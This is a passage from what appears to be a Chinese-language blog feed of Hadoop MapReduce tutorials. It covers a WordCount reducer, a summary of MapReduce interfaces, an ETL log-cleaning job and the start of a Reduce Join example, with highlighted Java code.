class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个 String 的封装类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Text</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆写map方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException 1.对输入的文件，以行为单位进行切分，按规则切分（空格）；</span></span><br><span class="line"><span class="comment">     *                              2.遍历切分完成后的集合或迭代器</span></span><br><span class="line"><span class="comment">     *                              3.组合&lt;key,value&gt;,通过Context进行输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 将传入的数据转换为字符串 指定分割符号为逗号</span></span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">stringTokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(value.toString(), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="comment">// 循环获取每个逗号分割出来的元素</span></span><br><span class="line">        <span class="keyword">while</span> (stringTokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            <span class="comment">// 接收获取元素</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> stringTokenizer.nextToken();</span><br><span class="line">            <span class="comment">// 添加分割后的元素到封装类中</span></span><br><span class="line">            text.set(word);</span><br><span class="line">            <span class="comment">// 上下文调度</span></span><br><span class="line">            context.write(text, intWritable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Reducer-保持不变-1"><a href="#（3）Reducer-保持不变-1" class="headerlink" title="（3）Reducer 保持不变"></a>（3）Reducer 保持不变</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.compress.reduceCompress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:41 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义一个存储 int类型的求和结果的变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">sumIntWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以key相同的组为单位处理，即 Reducer 方法调用一次，处理同 key的组数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 定义一个总词频变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 循环计数</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable val : values) &#123;</span><br><span class="line">            count += val.get();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将频数封装</span></span><br><span class="line">        sumIntWritable.set(count);</span><br><span class="line">        <span class="comment">// 上下文调度</span></span><br><span class="line">        context.write(key, sumIntWritable);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce 开发总结</title>
      <link href="/blog/6e775d30.html/"/>
      <url>/blog/6e775d30.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：输入数据接口：InputFormat"><a href="#一：输入数据接口：InputFormat" class="headerlink" title="一：输入数据接口：InputFormat"></a>一：输入数据接口：InputFormat</h1><ul><li>默认使用的实现类是：TextInputFormat</li><li>TextInputFormat 的功能逻辑是：一次读一行文本，然后将该行的起始偏移量作为 key，行内容作为 value 返回。</li><li>CombineTextInputFormat 可以把多个小文件合并成一个切片处理，提高处理效率。</li></ul><h1 id="二：逻辑处理接口：Mapper"><a href="#二：逻辑处理接口：Mapper" class="headerlink" title="二：逻辑处理接口：Mapper"></a>二：逻辑处理接口：Mapper</h1><ul><li>用户根据业务需求实现其中三个方法：map() setup() cleanup ()</li></ul><h1 id="三：Partitioner-分区"><a href="#三：Partitioner-分区" class="headerlink" title="三：Partitioner 分区"></a>三：Partitioner 分区</h1><ul><li>有默认实现 HashPartitioner，逻辑是根据 key 的哈希值和 numReduces 来返回一个 分区号；key.hashCode()&amp;Integer.MAXVALUE % numReduces</li><li>如果业务上有特别的需求，可以自定义分区。</li></ul><h1 id="四：Comparable-排序"><a href="#四：Comparable-排序" class="headerlink" title="四：Comparable 排序"></a>四：Comparable 排序</h1><ul><li>当我们用自定义的对象作为 key 来输出时，就必须要实现 WritableComparable 接 口，重写其中的 compareTo()方法。</li><li>部分排序：对最终输出的每一个文件进行内部排序。</li><li>全排序：对所有数据进行排序，通常只有一个 Reduce。</li><li>二次排序：排序的条件有两个。</li></ul><h1 id="五：Combiner-合并"><a href="#五：Combiner-合并" class="headerlink" title="五：Combiner 合并"></a>五：Combiner 合并</h1><ul><li>Combiner 合并可以提高程序执行效率，减少 IO 传输。但是使用时必须不能影响原有的 业务处理结果。</li></ul><h1 id="六：逻辑处理接口：Reducer"><a href="#六：逻辑处理接口：Reducer" class="headerlink" title="六：逻辑处理接口：Reducer"></a>六：逻辑处理接口：Reducer</h1><ul><li>用户根据业务需求实现其中三个方法：reduce() setup() cleanup ()</li></ul><h1 id="七：输出数据接口：OutputFormat"><a href="#七：输出数据接口：OutputFormat" class="headerlink" title="七：输出数据接口：OutputFormat"></a>七：输出数据接口：OutputFormat</h1><ul><li>用户根据业务需求实现其中三个方法：reduce() setup() cleanup ()</li><li>用户还可以自定义 OutputFormat。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce-ETL数据清洗</title>
      <link href="/blog/e164e43a.html/"/>
      <url>/blog/e164e43a.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：数据清洗（ETL）"><a href="#一：数据清洗（ETL）" class="headerlink" title="一：数据清洗（ETL）"></a>一：数据清洗（ETL）</h1><p>“ETL，是英文 Extract-Transform-Load 的缩写，用来描述将数据从来源端经过抽取 （Extract）、转换（Transform）、加载（Load）至目的端的过程。ETL 一词较常用在数据仓库，但其对象并不限于数据仓库。</p><p>在运行核心业务 MapReduce 程序之前，往往要先对数据进行清洗，清理掉不符合用户 要求的数据。<code>清理的过程往往只需要运行 Mapper 程序，不需要运行 Reduce 程序。</code></p><h1 id="二：案例分析"><a href="#二：案例分析" class="headerlink" title="二：案例分析"></a>二：案例分析</h1><h2 id="2-1-需求"><a href="#2-1-需求" class="headerlink" title="2.1 需求"></a>2.1 需求</h2><p>去除日志中字段个数小于等于 11 的日志。</p><p>（1）输入数据：web.log</p><p>（2）期望输出数据：每行字段长度都大于 11。</p><h2 id="2-2-需求分析"><a href="#2-2-需求分析" class="headerlink" title="2.2 需求分析"></a>2.2 需求分析</h2><p>在 Map 阶段对输入的数据根据规则进行过滤清洗。</p><h2 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h2><h3 id="（1）编写-WebLogMapper-类"><a href="#（1）编写-WebLogMapper-类" class="headerlink" title="（1）编写 WebLogMapper 类"></a>（1）编写 WebLogMapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.ETL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 12:52 2023/2/10</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, NullWritable&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 1.获取一行数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.解析日志</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> parseLog(line, context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.日志不合法退出</span></span><br><span class="line">        <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.日志合法直接写出</span></span><br><span class="line">        context.write(value, NullWritable.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 12:57 2023/2/10</span></span><br><span class="line"><span class="comment">     * Description: 日志清洗规则类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">parseLog</span><span class="params">(String line, Context context)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.按空格分割</span></span><br><span class="line">        <span class="keyword">final</span> String[] s = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.过滤日志长度大于11的数据</span></span><br><span class="line">        <span class="keyword">if</span> (s.length &gt; <span class="number">11</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）编写-WebLogDriver-类"><a href="#（2）编写-WebLogDriver-类" class="headerlink" title="（2）编写 WebLogDriver 类"></a>（2）编写 WebLogDriver 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.ETL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 13:01 2023/2/10</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 参数：输入输出路径</span></span><br><span class="line">        args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Y:\\Temp\\input&quot;</span>, <span class="string">&quot;Y:\\Temp\\output2&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取job信息</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载jar包</span></span><br><span class="line">        job.setJarByClass(WebLogMapper.class);</span><br><span class="line">        <span class="comment">// 关联map</span></span><br><span class="line">        job.setMapperClass(WebLogMapper.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置最终输出类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(NullWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 ReduceTask 个数为0</span></span><br><span class="line">        job.setNumReduceTasks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置输入和输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">0</span>]));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提交</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce Join 应用</title>
      <link href="/blog/bb94c1b7.html/"/>
      <url>/blog/bb94c1b7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Reduce-Join"><a href="#一：Reduce-Join" class="headerlink" title="一：Reduce Join"></a>一：Reduce Join</h1><p>​Map 端的主要工作：为来自不同表或文件的 key&#x2F;value 对，打标签以区别不同来源的记 录。然后用连接字段作为 key，其余部分和新加的标志作为 value，最后进行输出。</p><p>​Reduce 端的主要工作：在 Reduce 端以连接字段作为 key 的分组已经完成，我们只需要 在每一个分组当中将那些来源于不同文件的记录（在 Map 阶段已经打标志）分开，最后进 行合并就 ok 了。</p><h1 id="二：Reduce-Join-案例实操"><a href="#二：Reduce-Join-案例实操" class="headerlink" title="二：Reduce Join 案例实操"></a>二：Reduce Join 案例实操</h1><h2 id="2-1-需求"><a href="#2-1-需求" class="headerlink" title="2.1 需求"></a>2.1 需求</h2><p>订单数据表</p><img src="/blog/bb94c1b7.html/image-20230201175235245.png" style="zoom:50%;"><p>商品信息表</p><img src="/blog/bb94c1b7.html/image-20230201175323217.png" alt="image-20230201175323217" style="zoom:50%;"><img src="/blog/bb94c1b7.html/image-20230201175344682.png" alt="image-20230201175344682" style="zoom:50%;"><p>将商品信息表中数据根据商品 pid 合并到订单数据表中。</p><p>最终数据形式：</p><img src="/blog/bb94c1b7.html/image-20230201175431751.png" style="zoom:50%;"><h2 id="2-2-需求分析"><a href="#2-2-需求分析" class="headerlink" title="2.2 需求分析"></a>2.2 需求分析</h2><p>​通过将关联条件作为 Map 输出的 key，将两表满足 Join 条件的数据并携带数据所来源 的文件信息，发往同一个 ReduceTask，在 Reduce 中进行数据的串联。</p><h2 id="2-3-Reduce端表合并（数据倾斜）"><a href="#2-3-Reduce端表合并（数据倾斜）" class="headerlink" title="2.3 Reduce端表合并（数据倾斜）"></a>2.3 Reduce端表合并（数据倾斜）</h2><p><img src="/blog/bb94c1b7.html/image-20230201175657723.png"></p><h2 id="2-4-代码实现"><a href="#2-4-代码实现" class="headerlink" title="2.4 代码实现"></a>2.4 代码实现</h2><h3 id="（1）创建商品和订单合并后的-TableBean-类"><a href="#（1）创建商品和订单合并后的-TableBean-类" class="headerlink" title="（1）创建商品和订单合并后的 TableBean 类"></a>（1）创建商品和订单合并后的 TableBean 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.reduceJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInput;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:01 2023/2/1</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableBean</span> <span class="keyword">implements</span> <span class="title class_">Writable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String id;  <span class="comment">//订单ID</span></span><br><span class="line">    <span class="keyword">private</span> String pid;  <span class="comment">//产品ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> amount;  <span class="comment">//产品数量</span></span><br><span class="line">    <span class="keyword">private</span> String pName;  <span class="comment">//产品名称</span></span><br><span class="line">    <span class="keyword">private</span> String flag;  <span class="comment">//判断订单表（order）或者产品表（pd）的标志字段</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 最终输出形态</span></span><br><span class="line">        <span class="keyword">return</span> id + <span class="string">&quot;\t&quot;</span> + pName + <span class="string">&quot;\t&quot;</span> + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        dataOutput.writeUTF(id);</span><br><span class="line">        dataOutput.writeUTF(pid);</span><br><span class="line">        dataOutput.writeInt(amount);</span><br><span class="line">        dataOutput.writeUTF(pName);</span><br><span class="line">        dataOutput.writeUTF(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = dataInput.readUTF();</span><br><span class="line">        <span class="built_in">this</span>.pid = dataInput.readUTF();</span><br><span class="line">        <span class="built_in">this</span>.amount = dataInput.readInt();</span><br><span class="line">        <span class="built_in">this</span>.pName = dataInput.readUTF();</span><br><span class="line">        <span class="built_in">this</span>.flag = dataInput.readUTF();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）编写-TableMapper-类"><a href="#（2）编写-TableMapper-类" class="headerlink" title="（2）编写 TableMapper 类"></a>（2）编写 TableMapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.reduceJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.InputSplit;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileSplit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:38 2023/2/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, TableBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String filename;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">TableBean</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TableBean</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(Mapper&lt;LongWritable, Text, Text, TableBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取对应文件名称</span></span><br><span class="line">        <span class="type">InputSplit</span> <span class="variable">split</span> <span class="operator">=</span> context.getInputSplit();</span><br><span class="line">        <span class="type">FileSplit</span> <span class="variable">fileSplit</span> <span class="operator">=</span> (FileSplit) split;</span><br><span class="line">        filename = 